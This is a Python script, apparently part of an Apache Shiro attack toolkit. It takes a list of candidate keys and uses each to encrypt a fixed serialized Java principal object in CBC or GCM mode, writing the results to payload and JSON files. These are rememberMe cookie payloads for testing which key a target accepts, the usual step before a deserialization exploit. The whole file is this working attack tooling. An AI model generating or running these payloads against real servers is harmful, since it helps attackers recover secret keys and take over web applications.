import sys
import argparse
import base64
import json

sys.path.append("..")
from Utils import GCMCipher, CBCCipher

class GetKey(object):

    def __init__(self):
        self.checkdata = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="



    def getKey(self, ciphertype):
        keys = []
        payloads = []
        key_payload = {}

        with open('keys.txt', "r", encoding='utf8') as f:
            for line in f:
                keys.append(line.strip())

        try:
            for key in keys:
                # print("[-] start key: {0}".format(key))
                if ciphertype == 'CBC':
                    payload = CBCCipher(key, base64.b64decode(self.checkdata))
                if ciphertype == 'GCM':
                    payload = GCMCipher(key, base64.b64decode(self.checkdata))

                payload = payload.decode()
                payloads.append(payload)
                key_payload[key] = payload
            with open('./payload.txt', "w", encoding='utf-8') as f:
                for i in payloads:
                    f.write(i+'\n')
            with open('./key_payload.json', "w", encoding='utf-8') as json_file:
                json.dump(key_payload, json_file, ensure_ascii = False, indent = 6)

        except Exception as e:
            print(e)
            pass
        return False


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    # parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-T', '--ciphertype', help='CipherType, GCM or CBC', required=True)
    args = parser.parse_args()

    Main = GetKey()
    Main.getKey(args.ciphertype)

